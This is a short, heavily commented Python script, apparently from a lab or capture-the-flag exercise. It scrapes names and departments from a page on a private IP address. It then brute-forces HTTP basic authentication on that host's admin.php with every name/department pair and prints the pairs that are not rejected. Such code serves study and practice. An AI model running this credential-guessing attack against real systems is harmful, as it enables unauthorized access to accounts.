import requests #importing requests module
from bs4 import BeautifulSoup as bs4 #importing beautifulsoup to parse output and storing it as bs4

"""function to retrive content of page"""
def downPage(url): #definining function with a parameter of url
    r = requests.get(url) #using requests module to get url
    response = r.content #storing the content from requests.get(url) as response
    return response #returns the response from the page

"""function to get the values of names in table"""
def getNames(response):
    parser = bs4(response, "html.parser") #using beautifulsoup on response
    names = parser.find_all("td", id="name") #creating names variable and assigning to all elements corresponding to rows in table having id of "name"
    output = [] #list named output
    for name in names: #iterate over every element
        output.append(name.text) #get rid of html
    return output #return the list with just the names in text

"""function replicating getNames, but for Departments"""
def getDepts(response):
    parser = bs4(response, "html.parser")
    names = parser.find_all("td", id="department")
    output = []
    for name in names:
        output.append(name.text)
    return output

"""function to send request to admin.php containing login creds"""
def getAuth(url, username, password): #args for page url and login info
    r = requests.get(url, auth=(username, password)) #adding username and password paramaters to request
    if str(r.status_code) != "401": #if response code isn't 401 (unauthorized)
        print("Username: ", username,"Password: ", password, "Code: ", str(r.status_code)) #print username, password, and the status code 

if __name__ == "__main__":
    page = downPage("http://172.16.120.120") #download page content from the target URL and store it as "page"
    names = getNames(page) #assign list of names from "getNames" function to "names" variable
    uniqueNames = sorted(set(names)) #sort list to dump redundant names
    depts = getDepts(page) #assign list of departments from "getDepts" function to "depts" variable
    uniqueDepts = sorted(set(depts)) #again, sorting list to dump redundant departments

    print("Working...")
    for name in uniqueNames: #iterate over each name in uniqueNames list
        for dept in uniqueDepts: #iterate over each dept in uniqueDepts list
            getAuth("http://172.16.120.120/admin.php", name, dept) #make auth request for every possible combination of name/dept until both loops end
